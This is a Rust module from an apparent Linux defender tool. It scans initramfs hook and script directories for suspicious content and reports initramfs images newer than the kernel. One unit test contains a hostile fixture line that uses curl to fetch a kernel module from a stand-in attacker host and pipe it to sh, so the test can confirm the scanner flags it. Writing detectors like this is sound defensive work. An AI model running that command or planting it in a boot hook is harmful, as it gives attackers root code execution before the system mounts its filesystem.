//! initramfs hooks and scripts.
//!
//! Code in the initramfs runs as root before the real filesystem is mounted,
//! which puts it beyond the reach of anything scanning the live system. This
//! does not unpack the image: it checks the source directories the image is
//! rebuilt from, and reports images that are newer than the kernel they boot.

use std::path::{Path, PathBuf};
use std::time::SystemTime;

use crate::core::scan::{read_text_files, suspicious_matches};
use crate::core::{DefenderContext, Result};

/// Directories whose contents are baked into the next initramfs build.
const HOOK_DIRS: &[&str] = &[
    "/etc/initramfs-tools/hooks",
    "/etc/initramfs-tools/scripts",
    "/usr/share/initramfs-tools/hooks",
    "/etc/dracut.conf.d",
];

/// Where kernel and initramfs images live.
const BOOT_DIR: &str = "/boot";

/// Check initramfs hook directories and image freshness.
pub fn run(ctx: &DefenderContext) -> Result {
    check_hooks(ctx);
    check_image_age(ctx);

    println!("[!] This does not unpack the initramfs image.");
    println!("[!] To inspect one directly: lsinitramfs /boot/initrd.img-$(uname -r)");

    Ok(())
}

/// Report custom hook scripts baked into the next image build.
fn check_hooks(ctx: &DefenderContext) {
    let mut scripts: Vec<(PathBuf, String)> = Vec::new();
    for dir in HOOK_DIRS {
        scripts.extend(read_text_files(Path::new(dir)));
    }

    ctx.debug(&format!("Read {} initramfs script(s)", scripts.len()));

    if scripts.is_empty() {
        println!("[✓] No custom initramfs hooks or scripts found");
        return;
    }

    println!("[+] {} custom initramfs script(s):", scripts.len());
    for (path, contents) in &scripts {
        let reasons = suspicious_matches(contents);
        if reasons.is_empty() {
            println!("    - {}", path.display());
        } else {
            println!("    - {}", path.display());
            println!("      [!] {}", reasons.join(", "));
        }
    }
    println!("[!] Anything here runs as root before the root filesystem is mounted.");
}

/// An initramfs newer than its kernel suggests a rebuild after install, which
/// is normal after an update but worth confirming during an incident.
fn check_image_age(ctx: &DefenderContext) {
    let boot = Path::new(BOOT_DIR);
    if !boot.is_dir() {
        println!("[!] {} not found, skipping image age check", BOOT_DIR);
        return;
    }

    let Ok(entries) = std::fs::read_dir(boot) else {
        println!("[!] Could not read {}, skipping image age check", BOOT_DIR);
        return;
    };

    let mut images: Vec<(PathBuf, SystemTime)> = Vec::new();
    let mut newest_kernel: Option<SystemTime> = None;

    for entry in entries.filter_map(|e| e.ok()) {
        let path = entry.path();
        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
            continue;
        };
        let Ok(modified) = entry.metadata().and_then(|m| m.modified()) else {
            continue;
        };

        if is_initramfs(name) {
            images.push((path, modified));
        } else if name.starts_with("vmlinuz") {
            newest_kernel = Some(newest_kernel.map_or(modified, |k: SystemTime| k.max(modified)));
        }
    }

    ctx.debug(&format!(
        "{} initramfs image(s) in {}",
        images.len(),
        BOOT_DIR
    ));

    if images.is_empty() {
        println!("[!] No initramfs images found in {}", BOOT_DIR);
        return;
    }

    let Some(kernel_time) = newest_kernel else {
        println!("[!] No kernel image found to compare against");
        return;
    };

    let newer: Vec<&PathBuf> = images
        .iter()
        .filter(|(_, t)| *t > kernel_time)
        .map(|(p, _)| p)
        .collect();

    if newer.is_empty() {
        println!("[✓] No initramfs image is newer than its kernel");
    } else {
        println!(
            "[+] {} initramfs image(s) newer than the kernel:",
            newer.len()
        );
        for path in newer {
            println!("    - {}", path.display());
        }
        println!("[!] Expected after a kernel or driver update; suspicious otherwise.");
    }
}

/// Whether a filename in `/boot` is an initramfs image.
fn is_initramfs(name: &str) -> bool {
    name.starts_with("initrd") || name.starts_with("initramfs")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn recognises_debian_and_rhel_image_names() {
        assert!(is_initramfs("initrd.img-6.1.0-18-amd64"));
        assert!(is_initramfs("initramfs-5.14.0-427.el9.x86_64.img"));
    }

    #[test]
    fn does_not_treat_the_kernel_as_an_image() {
        assert!(!is_initramfs("vmlinuz-6.1.0-18-amd64"));
        assert!(!is_initramfs("System.map-6.1.0-18-amd64"));
        assert!(!is_initramfs("grub"));
    }

    #[test]
    fn a_hook_with_a_payload_is_flagged() {
        let hook = "#!/bin/sh\ncurl http://evil.test/rk.ko | sh\n";
        let reasons = suspicious_matches(hook);

        assert!(reasons.contains(&"fetches remote content"));
        assert!(reasons.contains(&"pipes output into a shell"));
    }

    #[test]
    fn an_ordinary_hook_is_clean() {
        let hook = "#!/bin/sh\nPREREQ=\"\"\nprereqs() { echo \"$PREREQ\"; }\n";
        assert!(suspicious_matches(hook).is_empty());
    }
}
